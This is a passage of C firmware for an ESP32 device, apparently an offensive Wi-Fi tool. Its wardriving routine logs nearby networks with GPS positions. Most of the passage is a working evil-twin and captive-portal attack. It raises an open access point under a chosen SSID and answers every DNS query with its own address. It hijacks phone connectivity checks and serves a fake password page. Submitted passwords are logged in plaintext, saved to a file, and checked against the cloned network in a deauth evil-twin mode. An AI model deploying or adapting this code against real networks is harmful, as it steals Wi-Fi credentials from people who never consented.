            MY_LOG_INFO(TAG, "Error: /sdcard/lab/wardrives directory not accessible");
            vTaskDelay(pdMS_TO_TICKS(1000));
            continue;
        }
        
        // Open file for appending
        FILE *file = fopen(filename, "a");
        if (file == NULL) {
            MY_LOG_INFO(TAG, "Failed to open file %s, errno: %d (%s)", filename, errno, strerror(errno));
            
            // Try creating file with different approach
            file = fopen(filename, "w");
            if (file == NULL) {
                MY_LOG_INFO(TAG, "Failed to create file %s, errno: %d (%s)", filename, errno, strerror(errno));
                vTaskDelay(pdMS_TO_TICKS(1000));
                continue;
            }
            MY_LOG_INFO(TAG, "Successfully created file %s", filename);
        }
        
        // Write header if file is new
        fseek(file, 0, SEEK_END);
        if (ftell(file) == 0) {
            fprintf(file, "WigleWifi-1.4,appRelease=v1.1,model=Gen4,release=v1.0,device=Gen4Board,display=SPI TFT,board=ESP32C5,brand=Laboratorium\n");
            fprintf(file, "MAC,SSID,AuthMode,FirstSeen,Channel,RSSI,CurrentLatitude,CurrentLongitude,AltitudeMeters,AccuracyMeters,Type\n");
        }
        
        // Get timestamp
        char timestamp[32];
        get_timestamp_string(timestamp, sizeof(timestamp));
        
        // Process scan results
        for (int i = 0; i < scan_count; i++) {
            wifi_ap_record_t *ap = &wardrive_scan_results[i];
            
            // Format MAC address
            char mac_str[18];
            snprintf(mac_str, sizeof(mac_str), "%02X:%02X:%02X:%02X:%02X:%02X",
                    ap->bssid[0], ap->bssid[1], ap->bssid[2],
                    ap->bssid[3], ap->bssid[4], ap->bssid[5]);
            
            // Escape SSID for CSV
            char escaped_ssid[64];
            escape_csv_field((const char*)ap->ssid, escaped_ssid, sizeof(escaped_ssid));
            
            // Get auth mode string
            const char* auth_mode = get_auth_mode_wiggle(ap->authmode);
            
            // Format line for Wiggle format
            char line[512];
            if (current_gps.valid) {
                snprintf(line, sizeof(line), 
                        "%s,%s,[%s],%s,%d,%d,%.7f,%.7f,%.2f,%.2f,WIFI\n",
                        mac_str, escaped_ssid, auth_mode, timestamp,
                        ap->primary, ap->rssi,
                        current_gps.latitude, current_gps.longitude,
                        current_gps.altitude, current_gps.accuracy);
            } else {
                snprintf(line, sizeof(line), 
                        "%s,%s,[%s],%s,%d,%d,0.0000000,0.0000000,0.00,0.00,WIFI\n",
                        mac_str, escaped_ssid, auth_mode, timestamp,
                        ap->primary, ap->rssi);
            }
            
            // Write to file and print to UART
            fprintf(file, "%s", line);
            printf("%s", line);
        }
        
        // Close file to ensure data is written
        fclose(file);
        
        if (scan_count > 0) {
            MY_LOG_INFO(TAG, "Logged %d networks to %s", scan_count, filename);
        }
        
        scan_counter++;
        
        // Check for stop command
        if (operation_stop_requested || !wardrive_active) {
            MY_LOG_INFO(TAG, "Wardrive: Stop requested, terminating...");
            wardrive_active = false;
            operation_stop_requested = false;
            break;
        }
        
        // Yield to allow console processing
        taskYIELD();
        
        vTaskDelay(pdMS_TO_TICKS(5000)); // Wait 5 seconds between scans
    }
    
    // Clear LED after wardrive finishes
    led_err = led_set_idle();
    if (led_err != ESP_OK) {
        ESP_LOGW(TAG, "Failed to restore idle LED after wardrive: %s", esp_err_to_name(led_err));
    }
    
    wardrive_active = false;
    wardrive_task_handle = NULL;
    MY_LOG_INFO(TAG, "Wardrive stopped after %d scans. Last file: w%d.log", scan_counter, wardrive_file_counter);
    
    vTaskDelete(NULL); // Delete this task
}

static int cmd_start_wardrive(int argc, char **argv) {
    (void)argc; (void)argv;
    
    // Check if wardrive is already running
    if (wardrive_active || wardrive_task_handle != NULL) {
        MY_LOG_INFO(TAG, "Wardrive already running. Use 'stop' to stop it first.");
        return 1;
    }
    
    // Reset stop flag at the beginning of operation
    operation_stop_requested = false;
    
    MY_LOG_INFO(TAG, "Starting wardrive mode...");
    
    // Initialize GPS UART
    esp_err_t ret = init_gps_uart();
    if (ret != ESP_OK) {
        MY_LOG_INFO(TAG, "Failed to initialize GPS UART: %s", esp_err_to_name(ret));
        return 1;
    }
    MY_LOG_INFO(TAG, "GPS UART initialized on pins %d (TX) and %d (RX)", GPS_TX_PIN, GPS_RX_PIN);
    
    // Initialize SD card
    ret = init_sd_card();
    if (ret != ESP_OK) {
        MY_LOG_INFO(TAG, "Failed to initialize SD card: %s", esp_err_to_name(ret));
        return 1;
    }
    MY_LOG_INFO(TAG, "SD card initialized on pins MISO:%d MOSI:%d CLK:%d CS:%d", 
                SD_MISO_PIN, SD_MOSI_PIN, SD_CLK_PIN, SD_CS_PIN);
    
    // Start wardrive in background task
    wardrive_active = true;
    BaseType_t result = xTaskCreate(
        wardrive_task,
        "wardrive_task",
        8192,  // Stack size - needs to be large for file operations
        NULL,
        5,     // Priority
        &wardrive_task_handle
    );
    
    if (result != pdPASS) {
        MY_LOG_INFO(TAG, "Failed to create wardrive task!");
        wardrive_active = false;
        return 1;
    }
    
    MY_LOG_INFO(TAG, "Wardrive task started. Use 'stop' to stop.");
    return 0;
}

// HTML form for password input (default)
static const char* default_portal_html = 
"<!DOCTYPE html>"
"<html>"
"<head>"
"<meta charset='UTF-8'>"
"<meta name='viewport' content='width=device-width, initial-scale=1.0'>"
"<title>Portal Access</title>"
"<style>"
"body { font-family: Arial, sans-serif; background: #f0f0f0; margin: 0; padding: 20px; }"
".container { max-width: 400px; margin: 50px auto; background: white; padding: 30px; border-radius: 10px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); }"
"h1 { text-align: center; color: #333; margin-bottom: 30px; }"
"form { display: flex; flex-direction: column; }"
"input[type='password'] { padding: 12px; margin: 10px 0; border: 1px solid #ddd; border-radius: 5px; font-size: 16px; }"
"button { padding: 12px; background: #007bff; color: white; border: none; border-radius: 5px; font-size: 16px; cursor: pointer; margin-top: 10px; }"
"button:hover { background: #0056b3; }"
"</style>"
"<script>"
"// Auto-redirect for captive portal detection"
"if (window.location.hostname !== '172.0.0.1') {"
"    window.location.href = 'http://172.0.0.1/';"
"}"
"</script>"
"</head>"
"<body>"
"<div class='container'>"
"<h1>Portal Access</h1>"
"<form method='POST' action='/login'>"
"<input type='password' name='password' placeholder='Enter password' required>"
"<button type='submit'>Log in</button>"
"</form>"
"</div>"
"</body>"
"</html>";

// HTTP handler for login form
static esp_err_t login_handler(httpd_req_t *req) {
    char buf[256];
    int ret = httpd_req_recv(req, buf, sizeof(buf) - 1);
    if (ret <= 0) {
        return ESP_FAIL;
    }
    buf[ret] = '\0';
    
    MY_LOG_INFO(TAG, "Received POST data: %s", buf);
    
    // Parse password from POST data
    char *password_start = strstr(buf, "password=");
    if (password_start) {
        password_start += 9; // Skip "password="
        char *password_end = strchr(password_start, '&');
        if (password_end) {
            *password_end = '\0';
        }
        
        // URL decode the password
        char decoded_password[64];
        int decoded_len = 0;
        for (char *p = password_start; *p && decoded_len < sizeof(decoded_password) - 1; p++) {
            if (*p == '%' && p[1] && p[2]) {
                char hex[3] = {p[1], p[2], '\0'};
                decoded_password[decoded_len++] = (char)strtol(hex, NULL, 16);
                p += 2;
            } else if (*p == '+') {
                decoded_password[decoded_len++] = ' ';
            } else {
                decoded_password[decoded_len++] = *p;
            }
        }
        decoded_password[decoded_len] = '\0';
        
        // Log the password
        MY_LOG_INFO(TAG, "Portal password received: %s", decoded_password);
        
        // If in evil twin mode, verify the password (save will happen after verification)
        if (applicationState == DEAUTH_EVIL_TWIN && evilTwinSSID != NULL) {
            verify_password(decoded_password);
        } else {
            // Regular portal mode - save all form data to portals.txt
            save_portal_data(portalSSID, buf);
        }
    }
    
    // Send response based on previous password attempt result
    const char* response;
    if (last_password_wrong) {
        // Show "Wrong Password" message
        response = 
            "<!DOCTYPE html><html><head>"
            "<meta charset='UTF-8'>"
            "<meta name='viewport' content='width=device-width, initial-scale=1.0'>"
            "<title>Wrong Password</title>"
            "<style>"
            "body { font-family: Arial, sans-serif; background: #f0f0f0; margin: 0; padding: 20px; }"
            ".container { max-width: 400px; margin: 50px auto; background: white; padding: 30px; border-radius: 10px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); }"
            "h1 { text-align: center; color: #d32f2f; margin-bottom: 20px; }"
            "p { text-align: center; color: #666; }"
            "a { display: block; text-align: center; margin-top: 20px; padding: 12px; background: #007bff; color: white; text-decoration: none; border-radius: 5px; }"
            "a:hover { background: #0056b3; }"
            "</style>"
            "</head>"
            "<body>"
            "<div class='container'>"
            "<h1>Wrong Password</h1>"
            "<p>The password you entered is incorrect. Please try again.</p>"
            "<a href='/portal'>Try Again</a>"
            "</div>"
            "</body></html>";
    } else {
        // Show "Processing" message
        response = 
            "<!DOCTYPE html><html><head>"
            "<meta charset='UTF-8'>"
            "<meta name='viewport' content='width=device-width, initial-scale=1.0'>"
            "<title>Processing</title>"
            "<style>"
            "body { font-family: Arial, sans-serif; background: #f0f0f0; margin: 0; padding: 20px; }"
            ".container { max-width: 400px; margin: 50px auto; background: white; padding: 30px; border-radius: 10px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); }"
            "h1 { text-align: center; color: #007bff; margin-bottom: 20px; }"
            "p { text-align: center; color: #666; }"
            ".spinner { margin: 20px auto; width: 50px; height: 50px; border: 5px solid #f3f3f3; border-top: 5px solid #007bff; border-radius: 50%; animation: spin 1s linear infinite; }"
            "@keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }"
            "</style>"
            "</head>"
            "<body>"
            "<div class='container'>"
            "<h1>Verifying...</h1>"
            "<div class='spinner'></div>"
            "<p>Please wait while we verify your credentials.</p>"
            "</div>"
            "</body></html>";
    }
    
    httpd_resp_send(req, response, HTTPD_RESP_USE_STRLEN);
    return ESP_OK;
}

// HTTP handler for GET /get endpoint
static esp_err_t get_handler(httpd_req_t *req) {
    // Get query string
    size_t query_len = httpd_req_get_url_query_len(req);
    if (query_len > 0) {
        char *query_string = malloc(query_len + 1);
        if (query_string) {
            if (httpd_req_get_url_query_str(req, query_string, query_len + 1) == ESP_OK) {
                
                // Parse password from query string
                char password_param[64];
                if (httpd_query_key_value(query_string, "password", password_param, sizeof(password_param)) == ESP_OK) {
                    // URL decode the password
                    char decoded_password[64];
                    int decoded_len = 0;
                    for (char *p = password_param; *p && decoded_len < sizeof(decoded_password) - 1; p++) {
                        if (*p == '%' && p[1] && p[2]) {
                            char hex[3] = {p[1], p[2], '\0'};
                            decoded_password[decoded_len++] = (char)strtol(hex, NULL, 16);
                            p += 2;
                        } else if (*p == '+') {
                            decoded_password[decoded_len++] = ' ';
                        } else {
                            decoded_password[decoded_len++] = *p;
                        }
                    }
                    decoded_password[decoded_len] = '\0';
                    
                    MY_LOG_INFO(TAG, "Password: %s", decoded_password);
                    
                    // If in evil twin mode, verify the password (save will happen after verification)
                    if (applicationState == DEAUTH_EVIL_TWIN && evilTwinSSID != NULL) {
                        verify_password(decoded_password);
                    } else {
                        // Regular portal mode - save all form data to portals.txt
                        // For GET requests, query_string has same format as POST data
                        save_portal_data(portalSSID, query_string);
                    }
                }
            }
            free(query_string);
        }
    }
    
    // Send response
    const char* response;
    if (last_password_wrong) {
        response = 
            "<!DOCTYPE html><html><head>"
            "<meta charset='UTF-8'>"
            "<meta name='viewport' content='width=device-width, initial-scale=1.0'>"
            "<title>Wrong Password</title>"
            "<style>"
            "body { font-family: Arial, sans-serif; background: #f0f0f0; margin: 0; padding: 20px; }"
            ".container { max-width: 400px; margin: 50px auto; background: white; padding: 30px; border-radius: 10px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); }"
            "h1 { text-align: center; color: #d32f2f; margin-bottom: 20px; }"
            "p { text-align: center; color: #666; }"
            "a { display: block; text-align: center; margin-top: 20px; padding: 12px; background: #007bff; color: white; text-decoration: none; border-radius: 5px; }"
            "a:hover { background: #0056b3; }"
            "</style>"
            "</head>"
            "<body>"
            "<div class='container'>"
            "<h1>Wrong Password</h1>"
            "<p>The password you entered is incorrect. Please try again.</p>"
            "<a href='/portal'>Try Again</a>"
            "</div>"
            "</body></html>";
    } else {
        response = 
            "<!DOCTYPE html><html><head>"
            "<meta charset='UTF-8'>"
            "<meta name='viewport' content='width=device-width, initial-scale=1.0'>"
            "<title>Processing</title>"
            "<style>"
            "body { font-family: Arial, sans-serif; background: #f0f0f0; margin: 0; padding: 20px; }"
            ".container { max-width: 400px; margin: 50px auto; background: white; padding: 30px; border-radius: 10px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); }"
            "h1 { text-align: center; color: #007bff; margin-bottom: 20px; }"
            "p { text-align: center; color: #666; }"
            ".spinner { margin: 20px auto; width: 50px; height: 50px; border: 5px solid #f3f3f3; border-top: 5px solid #007bff; border-radius: 50%; animation: spin 1s linear infinite; }"
            "@keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }"
            "</style>"
            "</head>"
            "<body>"
            "<div class='container'>"
            "<h1>Verifying...</h1>"
            "<div class='spinner'></div>"
            "<p>Please wait while we verify your credentials.</p>"
            "</div>"
            "</body></html>";
    }
    
    httpd_resp_send(req, response, HTTPD_RESP_USE_STRLEN);
    return ESP_OK;
}

// HTTP handler for POST /save endpoint
static esp_err_t save_handler(httpd_req_t *req) {
    char buf[256];
    int ret = httpd_req_recv(req, buf, sizeof(buf) - 1);
    if (ret <= 0) {
        return ESP_FAIL;
    }
    buf[ret] = '\0';
    
    // Parse password from POST data
    char *password_start = strstr(buf, "password=");
    if (password_start) {
        password_start += 9; // Skip "password="
        char *password_end = strchr(password_start, '&');
        if (password_end) {
            *password_end = '\0';
        }
        
        // URL decode the password
        char decoded_password[64];
        int decoded_len = 0;
        for (char *p = password_start; *p && decoded_len < sizeof(decoded_password) - 1; p++) {
            if (*p == '%' && p[1] && p[2]) {
                char hex[3] = {p[1], p[2], '\0'};
                decoded_password[decoded_len++] = (char)strtol(hex, NULL, 16);
                p += 2;
            } else if (*p == '+') {
                decoded_password[decoded_len++] = ' ';
            } else {
                decoded_password[decoded_len++] = *p;
            }
        }
        decoded_password[decoded_len] = '\0';
        
        MY_LOG_INFO(TAG, "Password: %s", decoded_password);
        
        // If in evil twin mode, verify the password (save will happen after verification)
        if (applicationState == DEAUTH_EVIL_TWIN && evilTwinSSID != NULL) {
            verify_password(decoded_password);
        } else {
            // Regular portal mode - save all form data to portals.txt
            save_portal_data(portalSSID, buf);
        }
    }
    
    // Send response
    const char* response;
    if (last_password_wrong) {
        response = 
            "<!DOCTYPE html><html><head>"
            "<meta charset='UTF-8'>"
            "<meta name='viewport' content='width=device-width, initial-scale=1.0'>"
            "<title>Wrong Password</title>"
            "<style>"
            "body { font-family: Arial, sans-serif; background: #f0f0f0; margin: 0; padding: 20px; }"
            ".container { max-width: 400px; margin: 50px auto; background: white; padding: 30px; border-radius: 10px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); }"
            "h1 { text-align: center; color: #d32f2f; margin-bottom: 20px; }"
            "p { text-align: center; color: #666; }"
            "a { display: block; text-align: center; margin-top: 20px; padding: 12px; background: #007bff; color: white; text-decoration: none; border-radius: 5px; }"
            "a:hover { background: #0056b3; }"
            "</style>"
            "</head>"
            "<body>"
            "<div class='container'>"
            "<h1>Wrong Password</h1>"
            "<p>The password you entered is incorrect. Please try again.</p>"
            "<a href='/portal'>Try Again</a>"
            "</div>"
            "</body></html>";
    } else {
        response = 
            "<!DOCTYPE html><html><head>"
            "<meta charset='UTF-8'>"
            "<meta name='viewport' content='width=device-width, initial-scale=1.0'>"
            "<title>Processing</title>"
            "<style>"
            "body { font-family: Arial, sans-serif; background: #f0f0f0; margin: 0; padding: 20px; }"
            ".container { max-width: 400px; margin: 50px auto; background: white; padding: 30px; border-radius: 10px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); }"
            "h1 { text-align: center; color: #007bff; margin-bottom: 20px; }"
            "p { text-align: center; color: #666; }"
            ".spinner { margin: 20px auto; width: 50px; height: 50px; border: 5px solid #f3f3f3; border-top: 5px solid #007bff; border-radius: 50%; animation: spin 1s linear infinite; }"
            "@keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }"
            "</style>"
            "</head>"
            "<body>"
            "<div class='container'>"
            "<h1>Verifying...</h1>"
            "<div class='spinner'></div>"
            "<p>Please wait while we verify your credentials.</p>"
            "</div>"
            "</body></html>";
    }
    
    httpd_resp_send(req, response, HTTPD_RESP_USE_STRLEN);
    return ESP_OK;
}

// HTTP handler for portal page
static esp_err_t portal_handler(httpd_req_t *req) {
    httpd_resp_set_type(req, "text/html");
    const char* portal_html = custom_portal_html ? custom_portal_html : default_portal_html;
    httpd_resp_send(req, portal_html, HTTPD_RESP_USE_STRLEN);
    return ESP_OK;
}

// URI handler for captive portal redirection
static esp_err_t captive_portal_handler(httpd_req_t *req) {
    // Redirect all requests to our portal page
    httpd_resp_set_status(req, "302 Found");
    httpd_resp_set_hdr(req, "Location", "/portal");
    httpd_resp_send(req, NULL, 0);
    return ESP_OK;
}

// Handler for root path - most devices try to access this first
static esp_err_t root_handler(httpd_req_t *req) {
    // Add captive portal headers for Android/Samsung detection
    httpd_resp_set_hdr(req, "Cache-Control", "no-cache, no-store, must-revalidate");
    httpd_resp_set_hdr(req, "Pragma", "no-cache");
    httpd_resp_set_hdr(req, "Expires", "0");
    httpd_resp_set_hdr(req, "Connection", "close");
    httpd_resp_set_hdr(req, "Content-Type", "text/html; charset=utf-8");
    
    // Always return the portal HTML with password form
    httpd_resp_set_type(req, "text/html");
    const char* portal_html = custom_portal_html ? custom_portal_html : default_portal_html;
    httpd_resp_send(req, portal_html, HTTPD_RESP_USE_STRLEN);
    return ESP_OK;
}

// Handler for Android captive portal detection (generate_204)
static esp_err_t android_captive_handler(httpd_req_t *req) {
    // Android expects a 204 No Content response for captive portal detection
    // If we return 204, Android thinks internet works
    // If we return 200 with HTML, Android thinks it's a captive portal
    // So we return 200 with our portal HTML to trigger captive portal
    httpd_resp_set_status(req, "200 OK");
    httpd_resp_set_hdr(req, "Cache-Control", "no-cache, no-store, must-revalidate");
    httpd_resp_set_hdr(req, "Pragma", "no-cache");
    httpd_resp_set_hdr(req, "Expires", "0");
    httpd_resp_set_hdr(req, "Content-Type", "text/html");
    
    // Send our portal HTML to trigger captive portal
    const char* portal_html = custom_portal_html ? custom_portal_html : default_portal_html;
    httpd_resp_send(req, portal_html, HTTPD_RESP_USE_STRLEN);
    return ESP_OK;
}

// Handler for iOS captive portal detection (hotspot-detect.html)
static esp_err_t ios_captive_handler(httpd_req_t *req) {
    // iOS detects captive portal when this endpoint returns something other than "Success"
    // So we return our portal HTML with password form to trigger captive portal popup
    httpd_resp_set_status(req, "200 OK");
    httpd_resp_set_hdr(req, "Cache-Control", "no-cache, no-store, must-revalidate");
    httpd_resp_set_hdr(req, "Pragma", "no-cache");
    httpd_resp_set_hdr(req, "Expires", "0");
    httpd_resp_set_hdr(req, "Content-Type", "text/html");
    
    // Send our portal HTML to show password form
    const char* portal_html = custom_portal_html ? custom_portal_html : default_portal_html;
    httpd_resp_send(req, portal_html, HTTPD_RESP_USE_STRLEN);
    return ESP_OK;
}

// Handler for common captive portal detection endpoints
static esp_err_t captive_detection_handler(httpd_req_t *req) {
    // Add captive portal headers
    httpd_resp_set_hdr(req, "Cache-Control", "no-cache, no-store, must-revalidate");
    httpd_resp_set_hdr(req, "Pragma", "no-cache");
    httpd_resp_set_hdr(req, "Expires", "0");
    httpd_resp_set_hdr(req, "Connection", "close");
    
    // Always return the portal HTML with password form
    httpd_resp_set_type(req, "text/html");
    const char* portal_html = custom_portal_html ? custom_portal_html : default_portal_html;
    httpd_resp_send(req, portal_html, HTTPD_RESP_USE_STRLEN);
    return ESP_OK;
}

// RFC 8908 Captive Portal API endpoint
static esp_err_t captive_api_handler(httpd_req_t *req) {
    // Set CORS headers
    httpd_resp_set_hdr(req, "Access-Control-Allow-Origin", "*");
    httpd_resp_set_hdr(req, "Access-Control-Allow-Methods", "GET, POST, OPTIONS");
    httpd_resp_set_hdr(req, "Access-Control-Allow-Headers", "Content-Type");
    
    // Handle preflight OPTIONS request
    if (req->method == HTTP_OPTIONS) {
        httpd_resp_set_status(req, "200 OK");
        httpd_resp_set_type(req, "application/json");
        httpd_resp_send(req, NULL, 0);
        return ESP_OK;
    }
    
    // RFC 8908 compliant JSON response
    const char* json_response = 
        "{"
        "\"captive\": true,"
        "\"user-portal-url\": \"http://172.0.0.1/portal\","
        "\"venue-info-url\": \"http://172.0.0.1/portal\","
        "\"is-portal\": true,"
        "\"can-extend-session\": false,"
        "\"seconds-remaining\": 0,"
        "\"bytes-remaining\": 0"
        "}";
    
    httpd_resp_set_status(req, "200 OK");
    httpd_resp_set_type(req, "application/json");
    httpd_resp_send(req, json_response, strlen(json_response));
    
    return ESP_OK;
}

// DNS server task for captive portal
static void dns_server_task(void *pvParameters) {
    (void)pvParameters;
    
    struct sockaddr_in server_addr;
    struct sockaddr_in client_addr;
    socklen_t client_addr_len = sizeof(client_addr);
    char rx_buffer[DNS_MAX_PACKET_SIZE];
    char tx_buffer[DNS_MAX_PACKET_SIZE];
    
    // Create UDP socket
    dns_server_socket = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
    if (dns_server_socket < 0) {
        dns_server_task_handle = NULL;
        vTaskDelete(NULL);
        return;
    }
    
    // Bind to DNS port 53
    memset(&server_addr, 0, sizeof(server_addr));
    server_addr.sin_family = AF_INET;
    server_addr.sin_addr.s_addr = htonl(INADDR_ANY);
    server_addr.sin_port = htons(DNS_PORT);
    
    int err = bind(dns_server_socket, (struct sockaddr *)&server_addr, sizeof(server_addr));
    if (err < 0) {
        close(dns_server_socket);
        dns_server_socket = -1;
        dns_server_task_handle = NULL;
        vTaskDelete(NULL);
        return;
    }
    
    // Set socket timeout so we can check portal_active flag periodically
    struct timeval timeout;
    timeout.tv_sec = 1;
    timeout.tv_usec = 0;
    setsockopt(dns_server_socket, SOL_SOCKET, SO_RCVTIMEO, &timeout, sizeof(timeout));
    
    // Main DNS server loop
    while (portal_active) {
        int len = recvfrom(dns_server_socket, rx_buffer, sizeof(rx_buffer), 0,
                          (struct sockaddr *)&client_addr, &client_addr_len);
        
        if (len < 0) {
            if (errno == EAGAIN || errno == EWOULDBLOCK) {
                // Timeout, check portal_active flag and continue
                continue;
            }
            break;
        }
        
        if (len < 12) {
            // DNS header is at least 12 bytes
            continue;
        }
        
        // Build DNS response
        // Copy transaction ID and flags from request
        memcpy(tx_buffer, rx_buffer, 2); // Transaction ID
        
        // Set flags: Response, Authoritative, No Error
        tx_buffer[2] = 0x81; // QR=1 (response), Opcode=0, AA=0, TC=0, RD=0
        tx_buffer[3] = 0x80; // RA=1, Z=0, RCODE=0 (no error)
        
        // Copy question count (should be 1)
        tx_buffer[4] = rx_buffer[4];
        tx_buffer[5] = rx_buffer[5];
        
        // Answer count = 1
        tx_buffer[6] = 0x00;
        tx_buffer[7] = 0x01;
        
        // Authority RRs = 0
        tx_buffer[8] = 0x00;
        tx_buffer[9] = 0x00;
        
        // Additional RRs = 0
        tx_buffer[10] = 0x00;
        tx_buffer[11] = 0x00;
        
        // Copy the question section from the request
        int question_len = 0;
        int pos = 12;
        while (pos < len && rx_buffer[pos] != 0) {
            pos += rx_buffer[pos] + 1;
        }
        pos++; // Skip final 0
        pos += 4; // Skip QTYPE and QCLASS
        question_len = pos - 12;
        
        if (question_len > 0 && question_len < (DNS_MAX_PACKET_SIZE - 12 - 16)) {
            memcpy(tx_buffer + 12, rx_buffer + 12, question_len);
            
            // Add answer section
            int answer_pos = 12 + question_len;
            
            // Name pointer to question (compression)
            tx_buffer[answer_pos++] = 0xC0;
            tx_buffer[answer_pos++] = 0x0C;
            
            // TYPE = A (0x0001)
            tx_buffer[answer_pos++] = 0x00;
            tx_buffer[answer_pos++] = 0x01;
            
            // CLASS = IN (0x0001)
            tx_buffer[answer_pos++] = 0x00;
            tx_buffer[answer_pos++] = 0x01;
            
            // TTL = 60 seconds
            tx_buffer[answer_pos++] = 0x00;
            tx_buffer[answer_pos++] = 0x00;
            tx_buffer[answer_pos++] = 0x00;
            tx_buffer[answer_pos++] = 0x3C;
            
            // Data length = 4 bytes
            tx_buffer[answer_pos++] = 0x00;
            tx_buffer[answer_pos++] = 0x04;
            
            // IP address: 172.0.0.1
            tx_buffer[answer_pos++] = 172;
            tx_buffer[answer_pos++] = 0;
            tx_buffer[answer_pos++] = 0;
            tx_buffer[answer_pos++] = 1;
            
            // Send response
            sendto(dns_server_socket, tx_buffer, answer_pos, 0,
                  (struct sockaddr *)&client_addr, client_addr_len);
        }
    }
    
    // Clean up
    close(dns_server_socket);
    dns_server_socket = -1;
    dns_server_task_handle = NULL;
    vTaskDelete(NULL);
}

// Start portal command
static int cmd_start_portal(int argc, char **argv) {
    // Check for SSID argument
    if (argc < 2) {
        MY_LOG_INFO(TAG, "Usage: start_portal <SSID>");
        MY_LOG_INFO(TAG, "Example: start_portal MyWiFi");
        return 1;
    }
    
    // Check if portal is already running
    if (portal_active) {
        MY_LOG_INFO(TAG, "Portal already running. Use 'stop' to stop it first.");
        return 0;
    }
    
    const char *ssid = argv[1];
    size_t ssid_len = strlen(ssid);
    
    // Validate SSID length (WiFi SSID max is 32 characters)
    if (ssid_len == 0 || ssid_len > 32) {
        MY_LOG_INFO(TAG, "SSID length must be between 1 and 32 characters");
        return 1;
    }
    
    // Store portal SSID for logging purposes
    if (portalSSID != NULL) {
        free(portalSSID);
    }
    portalSSID = malloc(ssid_len + 1);
    if (portalSSID != NULL) {
        strcpy(portalSSID, ssid);
    }
    
    MY_LOG_INFO(TAG, "Starting captive portal with SSID: %s", ssid);
    
    // Get AP netif and stop DHCP to configure custom IP
    esp_netif_t *ap_netif = esp_netif_get_handle_from_ifkey("WIFI_AP_DEF");
    if (!ap_netif) {
        MY_LOG_INFO(TAG, "Failed to get AP netif");
        return 1;
    }
    
    // Stop DHCP server to configure custom IP
    esp_netif_dhcps_stop(ap_netif);
    
    // Set static IP 172.0.0.1 for AP
    esp_netif_ip_info_t ip_info;
    ip_info.ip.addr = esp_ip4addr_aton("172.0.0.1");
    ip_info.gw.addr = esp_ip4addr_aton("172.0.0.1");
    ip_info.netmask.addr = esp_ip4addr_aton("255.255.255.0");
    
    esp_err_t ret = esp_netif_set_ip_info(ap_netif, &ip_info);
    if (ret != ESP_OK) {
        return 1;
    }
    
    MY_LOG_INFO(TAG, "AP IP set to 172.0.0.1");
    
    // Configure AP with provided SSID
    wifi_config_t ap_config = {0};
    memcpy(ap_config.ap.ssid, ssid, ssid_len);
    ap_config.ap.ssid_len = ssid_len;
    ap_config.ap.channel = 1;
    ap_config.ap.password[0] = '\0';
    ap_config.ap.max_connection = 4;
    ap_config.ap.authmode = WIFI_AUTH_OPEN;
    
    // Start AP
    ret = esp_wifi_set_mode(WIFI_MODE_AP);
    if (ret != ESP_OK) {
        MY_LOG_INFO(TAG, "Failed to set AP mode: %s", esp_err_to_name(ret));
        return 1;
    }
    
    ret = esp_wifi_set_config(WIFI_IF_AP, &ap_config);
    if (ret != ESP_OK) {
        MY_LOG_INFO(TAG, "Failed to set AP config: %s", esp_err_to_name(ret));
        return 1;
    }
    
    ret = esp_wifi_start();
    if (ret != ESP_OK) {
        MY_LOG_INFO(TAG, "Failed to start AP: %s", esp_err_to_name(ret));
        return 1;
    }
    
    // Start DHCP server
    ret = esp_netif_dhcps_start(ap_netif);
    if (ret != ESP_OK) {
        esp_wifi_stop();
        return 1;
    }
    
    // Wait a bit for AP to fully start
    vTaskDelay(pdMS_TO_TICKS(1000));
    
    // Configure HTTP server
    httpd_config_t config = HTTPD_DEFAULT_CONFIG();
    config.server_port = 80;
    config.max_open_sockets = 7;
    
    // Start HTTP server
    esp_err_t http_ret = httpd_start(&portal_server, &config);
    if (http_ret != ESP_OK) {
        MY_LOG_INFO(TAG, "Failed to start HTTP server: %s", esp_err_to_name(http_ret));
        esp_wifi_stop();
        return 1;
    }
    
    MY_LOG_INFO(TAG, "HTTP server started successfully on port 80");
    
    // Register URI handlers
    // Root path handler - most devices try this first
    httpd_uri_t root_uri = {
        .uri = "/",
        .method = HTTP_GET,
        .handler = root_handler,
        .user_ctx = NULL
    };
    httpd_register_uri_handler(portal_server, &root_uri);
    
    // Root path handler for POST requests
    httpd_uri_t root_post_uri = {
        .uri = "/",
        .method = HTTP_POST,
        .handler = root_handler,
        .user_ctx = NULL
    };
    httpd_register_uri_handler(portal_server, &root_post_uri);
    
    // Portal page handler
    httpd_uri_t portal_uri = {
        .uri = "/portal",
        .method = HTTP_GET,
        .handler = portal_handler,
        .user_ctx = NULL
    };
    httpd_register_uri_handler(portal_server, &portal_uri);
    
    // Login handler
    httpd_uri_t login_uri = {
        .uri = "/login",
        .method = HTTP_POST,
        .handler = login_handler,
        .user_ctx = NULL
    };
    httpd_register_uri_handler(portal_server, &login_uri);
    
    // GET handler
    httpd_uri_t get_uri = {
        .uri = "/get",
        .method = HTTP_GET,
        .handler = get_handler,
        .user_ctx = NULL
    };
    httpd_register_uri_handler(portal_server, &get_uri);
    
    // Save handler
    httpd_uri_t save_uri = {
        .uri = "/save",
        .method = HTTP_POST,
        .handler = save_handler,
        .user_ctx = NULL
    };
    httpd_register_uri_handler(portal_server, &save_uri);
    
    // Android captive portal detection
    httpd_uri_t android_captive_uri = {
        .uri = "/generate_204",
        .method = HTTP_GET,
        .handler = android_captive_handler,
        .user_ctx = NULL
    };
    httpd_register_uri_handler(portal_server, &android_captive_uri);
    
    // iOS captive portal detection
    httpd_uri_t ios_captive_uri = {
        .uri = "/hotspot-detect.html",
        .method = HTTP_GET,
        .handler = ios_captive_handler,
        .user_ctx = NULL
    };
    httpd_register_uri_handler(portal_server, &ios_captive_uri);
    
    // Samsung captive portal detection
    httpd_uri_t samsung_captive_uri = {
        .uri = "/ncsi.txt",
        .method = HTTP_GET,
        .handler = captive_detection_handler,
        .user_ctx = NULL
    };
